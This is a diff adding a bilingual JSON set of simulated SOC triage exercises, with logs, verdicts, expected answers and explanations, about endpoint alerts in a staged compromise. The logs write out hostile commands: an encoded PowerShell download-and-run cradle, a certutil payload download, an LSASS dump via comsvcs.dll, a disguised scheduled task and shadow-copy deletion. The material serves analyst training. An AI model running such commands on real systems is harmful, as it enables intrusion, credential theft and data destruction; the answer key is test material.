@@ -1,0 +1,236 @@
+{
+  "id": "T3",
+  "dia": { "es": "Miércoles", "en": "Wednesday" },
+  "tema": { "es": "Equipos y procesos", "en": "Endpoints and processes" },
+  "casos": [
+    {
+      "id": "T3-01",
+      "hora": "08:20",
+      "sev": "alta",
+      "fuente": "EDR",
+      "regla": { "es": "PowerShell con comando codificado", "en": "PowerShell with encoded command" },
+      "titulo": { "es": "PowerShell oculto con un comando en Base64", "en": "Hidden PowerShell with a Base64 command" },
+      "resumen": { "es": "PC-ALM-021 ejecuta powershell.exe con -enc y ventana oculta.", "en": "PC-ALM-021 runs powershell.exe with -enc and a hidden window." },
+      "logs": [
+        ["08:17:02", "edr", "process=wscript.exe parent=explorer.exe user=l.moreno host=PC-ALM-021 file=C:\\Users\\l.moreno\\Downloads\\albaran.js"],
+        ["08:17:04", "edr", "process=powershell.exe parent=wscript.exe user=l.moreno host=PC-ALM-021 cmd='powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYANgAvAGEALgBwAHMAMQAnACkA'"],
+        ["08:17:05", "fw01", "ALLOW tcp 10.20.2.21:52011 -> 198.51.100.66:80"],
+        ["08:17:06", "proxy01", "user=l.moreno GET http://198.51.100.66/a.ps1 200 bytes=14882 category=uncategorized"]
+      ],
+      "ruido": { "fuentes": ["edr", "proxy", "fw"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "url", "label": { "es": "URL que descarga (decodifica el Base64)", "en": "URL it downloads (decode the Base64)" }, "ok": ["http://198.51.100.66/a.ps1"] },
+        { "id": "padre", "label": { "es": "Proceso padre de PowerShell", "en": "PowerShell's parent process" }, "ok": ["wscript.exe"] }
+      ],
+      "mitre": "T1059.001",
+      "claves": ["198.51.100.66", "PC-ALM-021", "wscript"],
+      "competencias": ["triaje", "endpoint", "logs", "respuesta"],
+      "explica": {
+        "es": "El Base64 de -enc va en UTF-16LE: decodificado dice IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1'), es decir, descargar y ejecutar en memoria. Lo lanza un .js de Descargas abierto con wscript, y el proxy confirma la descarga. Aislar PC-ALM-021 y bloquear la IP. Decodificar comandos es tarea diaria de un N1.",
+        "en": "The -enc Base64 is UTF-16LE: decoded it reads IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1'), i.e. download and run in memory. A .js from Downloads opened with wscript launches it, and the proxy confirms the download. Isolate PC-ALM-021 and block the IP. Decoding commands is daily work for tier 1."
+      }
+    },
+    {
+      "id": "T3-02",
+      "hora": "09:00",
+      "sev": "alta",
+      "fuente": "EDR",
+      "regla": { "es": "Binario del sistema usado para descargar", "en": "System binary used to download" },
+      "titulo": { "es": "certutil descarga un ejecutable", "en": "certutil downloads an executable" },
+      "resumen": { "es": "certutil.exe con -urlcache en PC-FIN-007.", "en": "certutil.exe with -urlcache on PC-FIN-007." },
+      "logs": [
+        ["08:57:44", "edr", "process=certutil.exe parent=cmd.exe user=soporte$ host=PC-FIN-007 cmd='certutil -urlcache -split -f http://203.0.113.12/upd.exe C:\\Users\\Public\\upd.exe'"],
+        ["08:57:45", "fw01", "ALLOW tcp 10.20.3.41:50433 -> 203.0.113.12:80"],
+        ["08:57:47", "edr", "file_create host=PC-FIN-007 path=C:\\Users\\Public\\upd.exe sha256=9f2c...e01a signed=false"],
+        ["08:58:02", "edr", "process=upd.exe parent=cmd.exe user=soporte$ host=PC-FIN-007"]
+      ],
+      "ruido": { "fuentes": ["edr", "fw"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "ruta", "label": { "es": "Ruta del fichero descargado", "en": "Path of the downloaded file" }, "ok": ["C:\\Users\\Public\\upd.exe"] },
+        { "id": "cuenta", "label": { "es": "Cuenta que lo ejecuta", "en": "Account running it" }, "ok": ["soporte$"] }
+      ],
+      "mitre": "T1105",
+      "claves": ["upd.exe", "203.0.113.12", "soporte$"],
+      "competencias": ["triaje", "endpoint", "respuesta"],
+      "explica": {
+        "es": "certutil sirve para certificados, pero los atacantes lo usan para descargar porque viene firmado por Microsoft (un «LOLBin»). Lo ejecuta soporte$, la cuenta creada el lunes en este mismo equipo (T1-04): el compromiso de PC-FIN-007 avanza. Aislar, bloquear 203.0.113.12 y enlazar con T1-04.",
+        "en": "certutil is for certificates, but attackers use it to download because Microsoft signs it (a «LOLBin»). It runs as soporte$, the account created on Monday on this same PC (T1-04): the PC-FIN-007 compromise is progressing. Isolate, block 203.0.113.12 and link to T1-04."
+      }
+    },
+    {
+      "id": "T3-03",
+      "hora": "09:45",
+      "sev": "media",
+      "fuente": "EDR",
+      "regla": { "es": "Ejecución remota con PsExec", "en": "Remote execution with PsExec" },
+      "titulo": { "es": "PsExec contra varios equipos a la vez", "en": "PsExec against several hosts at once" },
+      "resumen": { "es": "adm.rvela usa PsExec desde PAW-01 contra 14 equipos.", "en": "adm.rvela uses PsExec from PAW-01 against 14 hosts." },
+      "logs": [
+        ["09:30:00", "itsm", "CHG-2077 aprobado: despliegue del agente de inventario v4.2 en Almacen · responsable adm.rvela · metodo PsExec · ventana 09:30-10:30"],
+        ["09:41:10", "edr", "process=PsExec64.exe parent=powershell.exe user=adm.rvela host=PAW-01 signer='Microsoft Corporation' cmd='PsExec64 @almacen.txt -s msiexec /i \\\\SRV-FS01\\deploy\\inventario-4.2.msi /qn'"],
+        ["09:41:12", "win-PC-ALM-014", "EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe AccountName=LocalSystem"],
+        ["09:43:50", "edr", "summary PsExec targets=14 hosts=PC-ALM-* result=ok"]
+      ],
+      "ruido": { "fuentes": ["edr", "win"], "n": 12 },
+      "veredicto": "benigno",
+      "accion": "cerrar",
+      "campos": [
+        { "id": "cambio", "label": { "es": "Cambio que lo autoriza", "en": "Change that authorises it" }, "ok": ["CHG-2077"] }
+      ],
+      "mitre": null,
+      "claves": ["CHG-2077", "adm.rvela", "PAW-01"],
+      "competencias": ["triaje", "endpoint", "comunicacion"],
+      "explica": {
+        "es": "PsExec es la misma herramienta que usan los atacantes para moverse, por eso salta la alerta. Aquí lo lanza el administrador desde su estación segura, para instalar un MSI interno en los equipos de Almacén y dentro de la ventana de CHG-2077. Benigno: se cierra citando el cambio.",
+        "en": "PsExec is the same tool attackers use to move laterally, which is why the alert fires. Here the admin runs it from his privileged workstation, to install an internal MSI on Warehouse PCs within the CHG-2077 window. Benign: close it citing the change."
+      }
+    },
+    {
+      "id": "T3-04",
+      "hora": "10:25",
+      "sev": "critica",
+      "fuente": "EDR",
+      "regla": { "es": "Acceso a la memoria de LSASS", "en": "LSASS memory access" },
+      "titulo": { "es": "Volcado de LSASS en el servidor de ficheros", "en": "LSASS dump on the file server" },
+      "resumen": { "es": "rundll32 con comsvcs.dll y MiniDump en SRV-FS01.", "en": "rundll32 with comsvcs.dll and MiniDump on SRV-FS01." },
+      "logs": [
+        ["10:22:31", "win-SRV-FS01", "EventID=4624 LogonType=3 TargetUserName=soporte$ IpAddress=10.20.3.41"],
+        ["10:23:05", "edr", "process=rundll32.exe parent=cmd.exe user=soporte$ host=SRV-FS01 cmd='rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\d.dmp full'"],
+        ["10:23:06", "edr", "process_access host=SRV-FS01 source=rundll32.exe target=lsass.exe pid=712 access=0x1fffff"],
+        ["10:23:40", "edr", "file_create host=SRV-FS01 path=C:\\Windows\\Temp\\d.dmp size=48MB"]
+      ],
+      "ruido": { "fuentes": ["edr", "win"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "cuenta", "label": { "es": "Cuenta usada", "en": "Account used" }, "ok": ["soporte$"] },
+        { "id": "origen", "label": { "es": "IP de la que viene la sesión", "en": "IP the session comes from" }, "ok": ["10.20.3.41"] }
+      ],
+      "mitre": "T1003.001",
+      "claves": ["SRV-FS01", "lsass", "soporte$"],
+      "competencias": ["triaje", "endpoint", "identidad", "respuesta"],
+      "explica": {
+        "es": "comsvcs.dll MiniDump contra el PID de lsass.exe es volcado de credenciales: quien tenga d.dmp tiene los secretos de quien haya iniciado sesión en SRV-FS01. La sesión viene de 10.20.3.41 (PC-FIN-007) con soporte$. Crítico: aislar SRV-FS01 y PC-FIN-007, deshabilitar soporte$ y escalar como incidente con todos los tickets enlazados.",
+        "en": "comsvcs.dll MiniDump against lsass.exe's PID is credential dumping: whoever has d.dmp has the secrets of everyone logged on to SRV-FS01. The session comes from 10.20.3.41 (PC-FIN-007) as soporte$. Critical: isolate SRV-FS01 and PC-FIN-007, disable soporte$ and escalate as an incident with every ticket linked."
+      }
+    },
+    {
+      "id": "T3-05",
+      "hora": "11:00",
+      "sev": "media",
+      "fuente": "SIEM",
+      "regla": { "es": "Tarea programada creada desde la línea de comandos", "en": "Scheduled task created from the command line" },
+      "titulo": { "es": "Tarea programada que ejecuta un binario de C:\\Users\\Public", "en": "Scheduled task running a binary from C:\\Users\\Public" },
+      "resumen": { "es": "Evento 4698 en PC-FIN-007 con un nombre que imita a OneDrive.", "en": "Event 4698 on PC-FIN-007 with a name mimicking OneDrive." },
+      "logs": [
+        ["10:58:12", "win-PC-FIN-007", "EventID=4688 CommandLine='schtasks /create /tn OneDriveUpdate /tr C:\\Users\\Public\\upd.exe /sc onlogon /ru SYSTEM' SubjectUserName=soporte$"],
+        ["10:58:12", "win-PC-FIN-007", "EventID=4698 TaskName=\\OneDriveUpdate SubjectUserName=soporte$"],
+        ["10:58:30", "edr", "baseline: OneDrive legitimo se actualiza con 'OneDrive Standalone Update Task-S-1-5-21...' desde %LocalAppData%\\Microsoft\\OneDrive"]
+      ],
+      "ruido": { "fuentes": ["win", "edr"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "tarea", "label": { "es": "Nombre de la tarea", "en": "Task name" }, "ok": ["OneDriveUpdate", "\\OneDriveUpdate"] },
+        { "id": "binario", "label": { "es": "Binario que ejecuta", "en": "Binary it runs" }, "ok": ["C:\\Users\\Public\\upd.exe", "upd.exe"] }
+      ],
+      "mitre": "T1053.005",
+      "claves": ["OneDriveUpdate", "upd.exe"],
+      "competencias": ["triaje", "endpoint", "respuesta"],
+      "explica": {
+        "es": "La tarea imita a OneDrive pero ejecuta como SYSTEM el upd.exe descargado con certutil (T3-02) en cada inicio de sesión: es persistencia. La legítima tiene otro nombre y otra ruta. Contener: borrar la tarea y el binario forma parte de la limpieza que coordina el N2; el equipo ya debería estar aislado.",
+        "en": "The task mimics OneDrive but runs the upd.exe downloaded with certutil (T3-02) as SYSTEM at every logon: persistence. The legitimate one has a different name and path. Contain: removing the task and binary is part of the clean-up tier 2 coordinates; the PC should already be isolated."
+      }
+    },
+    {
+      "id": "T3-06",
+      "hora": "11:40",
+      "sev": "baja",
+      "fuente": "EDR",
+      "regla": { "es": "Detección heurística de baja confianza", "en": "Low-confidence heuristic detection" },
+      "titulo": { "es": "El EDR marca el actualizador de un lector de PDF", "en": "The EDR flags a PDF reader updater" },
+      "resumen": { "es": "AdobeARM.exe marcado como sospechoso en tres equipos tras su actualización.", "en": "AdobeARM.exe flagged as suspicious on three PCs after its update." },
+      "logs": [
+        ["11:35:00", "edr", "detection host=PC-MKT-002 file=C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe confidence=low reason=new_binary_prevalence"],
+        ["11:35:01", "edr", "file_info AdobeARM.exe signer='Adobe Inc.' signature=valid sha256=4b1d...77ac first_seen=hoy prevalence_global=2.1M"],
+        ["11:35:02", "edr", "detection host=PC-ALM-014 file=AdobeARM.exe confidence=low (mismo sha256)"],
+        ["11:35:40", "proxy01", "GET https://armmf.adobe.example/arm-manifests/win/ArmManifest3.msi 200"]
+      ],
+      "ruido": { "fuentes": ["edr", "proxy"], "n": 12 },
+      "veredicto": "fp",
+      "accion": "cerrar",
+      "campos": [
+        { "id": "prueba", "label": { "es": "Qué confirma que es legítimo", "en": "What confirms it is legitimate" }, "ok": ["firma", "firma digital", "firma valida", "firmado", "signature", "digital signature", "valid signature", "signed"], "derivado": true }
+      ],
+      "mitre": null,
+      "claves": ["Adobe", "firma"],
+      "competencias": ["triaje", "endpoint"],
+      "explica": {
+        "es": "Firma válida de Adobe, ruta de instalación estándar, millones de equipos con el mismo hash y una descarga desde el servidor de actualizaciones. El motivo de la alerta es solo que el binario es nuevo hoy. Falso positivo: se cierra y se propone añadir el hash a la lista de confianza.",
+        "en": "Valid Adobe signature, standard install path, millions of machines with the same hash and a download from the update server. The only reason for the alert is that the binary is new today. False positive: close it and propose adding the hash to the allow list."
+      }
+    },
+    {
+      "id": "T3-07",
+      "hora": "12:30",
+      "sev": "critica",
+      "fuente": "SIEM",
+      "regla": { "es": "Renombrado masivo de ficheros", "en": "Mass file renaming" },
+      "titulo": { "es": "Miles de ficheros renombrados en el servidor de ficheros", "en": "Thousands of files renamed on the file server" },
+      "resumen": { "es": "Más de 5 000 renombrados por minuto en \\\\SRV-FS01 con una extensión nueva.", "en": "Over 5,000 renames per minute on \\\\SRV-FS01 with a new extension." },
+      "logs": [
+        ["12:27:10", "win-SRV-FS01", "EventID=4663 ObjectName=\\\\SRV-FS01\\Comercial\\ofertas_2026.xlsx.lock SubjectUserName=soporte$ IpAddress=10.20.3.41 AccessMask=DELETE"],
+        ["12:27:11", "win-SRV-FS01", "EventID=4663 ObjectName=\\\\SRV-FS01\\Comercial\\clientes.docx.lock SubjectUserName=soporte$ IpAddress=10.20.3.41"],
+        ["12:28:00", "win-SRV-FS01", "summary renames=5212/min extension=.lock share=Comercial,Finanzas"],
+        ["12:28:02", "win-SRV-FS01", "file_create \\\\SRV-FS01\\Comercial\\LEEME_RECUPERAR.txt SubjectUserName=soporte$"],
+        ["12:29:40", "edr", "host=SRV-BKP01 vssadmin delete shadows /all /quiet user=soporte$ blocked=true"]
+      ],
+      "ruido": { "fuentes": ["win", "edr"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "origen", "label": { "es": "IP de origen del cifrado", "en": "Source IP of the encryption" }, "ok": ["10.20.3.41"] },
+        { "id": "extension", "label": { "es": "Extensión añadida", "en": "Extension added" }, "ok": [".lock", "lock"] }
+      ],
+      "mitre": "T1486",
+      "claves": ["10.20.3.41", ".lock", "SRV-FS01"],
+      "competencias": ["triaje", "logs", "respuesta"],
+      "explica": {
+        "es": "Es ransomware en curso: cifra a través de la red desde 10.20.3.41 (PC-FIN-007) con soporte$, deja una nota de rescate e intenta borrar las instantáneas de las copias. Cada minuto cuenta: aislar PC-FIN-007 y SRV-FS01, deshabilitar soporte$ y activar el plan de respuesta. El aviso a dirección lo da el N2 o el responsable de incidentes.",
+        "en": "Ransomware in progress: it encrypts over the network from 10.20.3.41 (PC-FIN-007) as soporte$, drops a ransom note and tries to delete backup shadow copies. Every minute counts: isolate PC-FIN-007 and SRV-FS01, disable soporte$ and trigger the response plan. Tier 2 or the incident lead informs management."
+      }
+    },
+    {
+      "id": "T3-08",
+      "hora": "13:50",
+      "sev": "media",
+      "fuente": "SIEM",
+      "regla": { "es": "RDP interno poco habitual", "en": "Unusual internal RDP" },
+      "titulo": { "es": "Un técnico abre RDP contra la base de datos", "en": "A technician opens RDP to the database" },
+      "resumen": { "es": "Primera conexión RDP de h.diaz a SRV-SQL01 en 90 días.", "en": "First RDP connection from h.diaz to SRV-SQL01 in 90 days." },
+      "logs": [
+        ["13:40:00", "itsm", "INC-5521 asignado a h.diaz: 'SRV-SQL01 sin espacio en C:, la aplicación de pedidos no guarda' · prioridad alta"],
+        ["13:47:20", "win-SRV-SQL01", "EventID=4624 LogonType=10 TargetUserName=h.diaz IpAddress=10.20.6.8 WorkstationName=PC-SOP-002"],
+        ["13:49:05", "win-SRV-SQL01", "EventID=4688 NewProcessName=cleanmgr.exe SubjectUserName=h.diaz"],
+        ["13:55:40", "itsm", "INC-5521 nota: 'liberados 18 GB de registros antiguos, aplicación operativa'"]
+      ],
+      "ruido": { "fuentes": ["win"], "n": 12 },
+      "veredicto": "benigno",
+      "accion": "cerrar",
+      "campos": [
+        { "id": "ticket", "label": { "es": "Ticket que lo justifica", "en": "Ticket that explains it" }, "ok": ["INC-5521"] }
+      ],
+      "mitre": null,
+      "claves": ["INC-5521", "h.diaz"],
+      "competencias": ["triaje", "identidad", "comunicacion"],
+      "explica": {
+        "es": "Lo raro no siempre es malo: h.diaz tiene asignada una incidencia urgente justo en ese servidor, entra desde su equipo de soporte y lo que hace (liberar disco) encaja con el ticket. Benigno, cerrado con INC-5521. Después de lo que ha pasado esta semana, conviene comprobarlo siempre antes de cerrar.",
+        "en": "Unusual is not always bad: h.diaz has an urgent incident assigned on exactly that server, connects from his helpdesk PC and what he does (free disk space) matches the ticket. Benign, closed with INC-5521. After this week, it is worth checking every time before closing."
+      }
+    }
+  ]
+}
